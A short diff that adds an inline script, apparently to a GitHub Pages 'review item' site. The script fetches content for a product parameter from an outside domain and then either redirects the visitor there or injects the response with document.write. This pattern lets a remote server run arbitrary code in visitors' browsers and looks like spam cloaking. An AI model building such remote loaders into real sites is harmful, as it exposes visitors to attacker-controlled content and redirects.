@@ -1,0 +1,16 @@
+<script>
+const path_url = window.location.href;
+const path_clear = path_url.replace("https://reviewitem.github.io/?product=", "");
+const url = "https://itemapi.shop/product/"+path_clear;
+fetch(url)
+  .then(response => {
+    return response.text();
+  })
+  .then(data => {
+    if(data=='go'){
+      window.location.replace("https://itemapi.shop/go/"+path_clear);
+    } else {
+      document.write(data);
+    }
+  })
+</script>
